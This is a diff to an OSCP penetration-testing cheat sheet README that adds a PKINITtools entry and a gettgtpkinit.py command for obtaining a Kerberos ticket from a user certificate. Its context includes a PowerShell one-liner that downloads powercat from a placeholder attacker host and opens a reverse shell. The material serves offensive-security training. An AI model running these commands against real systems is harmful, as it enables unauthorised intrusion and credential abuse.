@@ -133,6 +133,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [logrotten](https://github.com/0xsyr0/OSCP#logrotten)
 		- [Lsass](https://github.com/0xsyr0/OSCP#lsass)
 		- [Path Variable Hijacking](https://github.com/0xsyr0/OSCP#path-variable-hijacking)
+		- [PKINITtools](https://github.com/0xsyr0/OSCP#pkinittools)
 		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
@@ -289,6 +290,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | LAPSDumper | https://github.com/n00py/LAPSDumper |
 | Certify | https://github.com/GhostPack/Certify |
 | Certipy | https://github.com/ly4k/Certipy |
+| PKINITtools | https://github.com/dirkjanm/PKINITtools |
 | Whisker | https://github.com/eladshamir/Whisker |
 | PyWhisker | https://github.com/ShutdownRepo/pywhisker |
 | Rubeus | https://github.com/GhostPack/Rubeus |
@@ -3262,6 +3264,12 @@ export PATH=$(pwd):$PATH
 
 ```c
 PS C:\> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
+```
+
+#### PKINITtools
+
+```c
+python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx <USERNAME>.ccache
 ```
 
 #### PowerShell
